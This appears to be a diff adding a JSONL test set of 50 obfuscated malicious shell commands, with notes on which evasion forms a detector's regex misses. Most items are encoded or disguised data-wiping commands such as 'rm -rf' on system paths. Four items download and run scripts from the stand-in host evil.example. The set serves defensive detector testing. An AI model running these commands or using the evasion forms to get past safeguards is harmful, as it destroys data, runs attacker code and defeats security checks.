@@ -1,0 +1,50 @@
+{"id":"E-001","command":"echo cm0gLXJmIC8= | base64 -d | sh","label":"malicious","family":"file_delete","obfuscation":"base64_echo_pipe","source":"variant_of:M-001","note":"the one base64 form the detector recognizes"}
+{"id":"E-002","command":"base64 -d <<< cm0gLXJmIC8= | sh","label":"malicious","family":"file_delete","obfuscation":"base64_herestring","source":"variant_of:M-001","note":"herestring form, not matched by detector regex"}
+{"id":"E-003","command":"printf 'cm0gLXJmIC8=' | base64 --decode | bash","label":"malicious","family":"file_delete","obfuscation":"base64_printf","source":"variant_of:M-001"}
+{"id":"E-004","command":"echo 'cm0gLXJmIC9ldGM=' | base64 -D | sh","label":"malicious","family":"file_delete","obfuscation":"base64_macos_flag","source":"variant_of:M-007","note":"-D is the macOS flag, detector expects -d"}
+{"id":"E-005","command":"openssl enc -base64 -d <<< cm0gLXJmIC8= | sh","label":"malicious","family":"file_delete","obfuscation":"base64_openssl","source":"variant_of:M-001"}
+{"id":"E-006","command":"echo 726d202d7266202f | xxd -r -p | sh","label":"malicious","family":"file_delete","obfuscation":"hex_xxd","source":"variant_of:M-001"}
+{"id":"E-007","command":"python3 -c \"import base64;exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgncm0gLXJmIC8nKQ=='))\"","label":"malicious","family":"file_delete","obfuscation":"base64_python_exec","source":"variant_of:M-001"}
+{"id":"E-008","command":"eval \"$(echo cm0gLXJmIC90bXAvKg== | base64 -d)\"","label":"malicious","family":"file_delete","obfuscation":"base64_in_substitution","source":"variant_of:M-001"}
+{"id":"E-009","command":"$(echo rm) -rf /data","label":"malicious","family":"file_delete","obfuscation":"command_substitution","source":"variant_of:M-005"}
+{"id":"E-010","command":"`echo rm` -rf /var/lib/data","label":"malicious","family":"file_delete","obfuscation":"backtick_substitution","source":"variant_of:M-005"}
+{"id":"E-011","command":"$( $(echo ec)ho rm ) -rf /data","label":"malicious","family":"file_delete","obfuscation":"nested_substitution","source":"variant_of:M-005","note":"nested $( ) — regex [^)]+ cannot capture"}
+{"id":"E-012","command":"eval $(printf '\\x72\\x6d') -rf /opt","label":"malicious","family":"file_delete","obfuscation":"hex_escape_substitution","source":"variant_of:M-001"}
+{"id":"E-013","command":"CMD=rm; $CMD -rf /data","label":"malicious","family":"file_delete","obfuscation":"variable_indirection","source":"variant_of:M-005"}
+{"id":"E-014","command":"A=r;B=m;$A$B -rf /data","label":"malicious","family":"file_delete","obfuscation":"variable_split","source":"variant_of:M-005"}
+{"id":"E-015","command":"r''m -rf /data","label":"malicious","family":"file_delete","obfuscation":"quote_split","source":"variant_of:M-005"}
+{"id":"E-016","command":"r\"\"m -rf /data","label":"malicious","family":"file_delete","obfuscation":"quote_split","source":"variant_of:M-005"}
+{"id":"E-017","command":"r\\m -rf /data","label":"malicious","family":"file_delete","obfuscation":"backslash_split","source":"variant_of:M-005"}
+{"id":"E-018","command":"$'\\x72\\x6d' -rf /data","label":"malicious","family":"file_delete","obfuscation":"ansi_c_quoting","source":"variant_of:M-005"}
+{"id":"E-019","command":"/bin/rm -rf /data","label":"malicious","family":"file_delete","obfuscation":"absolute_path","source":"variant_of:M-005"}
+{"id":"E-020","command":"/usr/bin/env rm -rf /data","label":"malicious","family":"file_delete","obfuscation":"env_wrapper","source":"variant_of:M-005"}
+{"id":"E-021","command":"sh -c 'rm -rf /data'","label":"malicious","family":"file_delete","obfuscation":"shell_wrapper","source":"variant_of:M-005"}
+{"id":"E-022","command":"bash -c \"rm -rf /data\"","label":"malicious","family":"file_delete","obfuscation":"shell_wrapper","source":"variant_of:M-005"}
+{"id":"E-023","command":"nohup sh -c 'rm -rf /data' &","label":"malicious","family":"file_delete","obfuscation":"shell_wrapper_background","source":"variant_of:M-005"}
+{"id":"E-024","command":"xargs -I{} rm -rf {} <<< /data","label":"malicious","family":"file_delete","obfuscation":"xargs_wrapper","source":"variant_of:M-005"}
+{"id":"E-025","command":"echo /data | xargs rm -rf","label":"malicious","family":"file_delete","obfuscation":"xargs_pipe","source":"variant_of:M-005"}
+{"id":"E-026","command":"rm -rf /etc/../etc/nginx","label":"malicious","family":"file_delete","obfuscation":"path_traversal","source":"variant_of:M-007","note":"startsWith check without normalization"}
+{"id":"E-027","command":"rm -rf /var/../etc","label":"malicious","family":"file_delete","obfuscation":"path_traversal","source":"variant_of:M-007"}
+{"id":"E-028","command":"rm -rf /./etc/nginx","label":"malicious","family":"file_delete","obfuscation":"path_dot_segment","source":"variant_of:M-007"}
+{"id":"E-029","command":"rm -rf //etc//nginx","label":"malicious","family":"file_delete","obfuscation":"path_double_slash","source":"variant_of:M-007"}
+{"id":"E-030","command":"cd /etc && rm -rf nginx","label":"malicious","family":"file_delete","obfuscation":"path_via_cwd","source":"variant_of:M-007","note":"target never appears as an absolute path"}
+{"id":"E-031","command":"cd / ; cd etc ; rm -rf nginx","label":"malicious","family":"file_delete","obfuscation":"path_via_cwd_chain","source":"variant_of:M-007"}
+{"id":"E-032","command":"ls -la && rm -rf /data","label":"malicious","family":"file_delete","obfuscation":"chain_and","source":"variant_of:M-005"}
+{"id":"E-033","command":"echo ok; rm -rf /data","label":"malicious","family":"file_delete","obfuscation":"chain_semicolon","source":"variant_of:M-005"}
+{"id":"E-034","command":"false || rm -rf /data","label":"malicious","family":"file_delete","obfuscation":"chain_or","source":"variant_of:M-005"}
+{"id":"E-035","command":"echo \"safe && harmless\" && rm -rf /data","label":"malicious","family":"file_delete","obfuscation":"chain_with_quoted_operator","source":"variant_of:M-005","note":"quote-unaware split mis-parses this"}
+{"id":"E-036","command":"echo 'a; rm -rf /decoy' ; rm -rf /data","label":"malicious","family":"file_delete","obfuscation":"quoted_decoy","source":"variant_of:M-005"}
+{"id":"E-037","command":"if true; then rm -rf /data; fi","label":"malicious","family":"file_delete","obfuscation":"control_flow","source":"variant_of:M-005"}
+{"id":"E-038","command":"for d in /data /var/lib; do rm -rf $d; done","label":"malicious","family":"file_delete","obfuscation":"loop","source":"variant_of:M-005"}
+{"id":"E-039","command":"cat <<'EOF' | sh\nrm -rf /data\nEOF","label":"malicious","family":"file_delete","obfuscation":"heredoc","source":"variant_of:M-005"}
+{"id":"E-040","command":"rm    -rf     /data","label":"malicious","family":"file_delete","obfuscation":"whitespace_padding","source":"variant_of:M-005"}
+{"id":"E-041","command":"rm\t-rf\t/data","label":"malicious","family":"file_delete","obfuscation":"tab_separator","source":"variant_of:M-005"}
+{"id":"E-042","command":"rm -r -f /data","label":"malicious","family":"file_delete","obfuscation":"flag_split","source":"variant_of:M-005"}
+{"id":"E-043","command":"rm --recursive --force /data","label":"malicious","family":"file_delete","obfuscation":"long_flags","source":"variant_of:M-005"}
+{"id":"E-044","command":"rm -fr /data","label":"malicious","family":"file_delete","obfuscation":"flag_reorder","source":"variant_of:M-005"}
+{"id":"E-045","command":"curl -s http://evil.example/s.sh -o /tmp/s.sh && sh /tmp/s.sh","label":"malicious","family":"reverse_shell","obfuscation":"download_then_run","source":"variant_of:M-050","note":"splits curl|sh into two stages"}
+{"id":"E-046","command":"curl -s http://evil.example/s.sh > /tmp/s && . /tmp/s","label":"malicious","family":"reverse_shell","obfuscation":"download_then_source","source":"variant_of:M-050"}
+{"id":"E-047","command":"curl -s http://evil.example/s.sh | tee /tmp/s | bash","label":"malicious","family":"reverse_shell","obfuscation":"tee_in_pipeline","source":"variant_of:M-050","note":"[^|]+ before the pipe is broken by the extra pipe"}
+{"id":"E-048","command":"wget -q -O /tmp/x http://evil.example/x && chmod +x /tmp/x && /tmp/x","label":"malicious","family":"reverse_shell","obfuscation":"multistage","source":"variant_of:M-052"}
+{"id":"E-049","command":"rm -rf /dаta","label":"malicious","family":"file_delete","obfuscation":"unicode_homoglyph","source":"variant_of:M-005","note":"Cyrillic 'а' U+0430 in target"}
+{"id":"E-050","command":"rm -rf ${HOME}/Documents","label":"malicious","family":"file_delete","obfuscation":"env_var_target","source":"variant_of:M-004"}
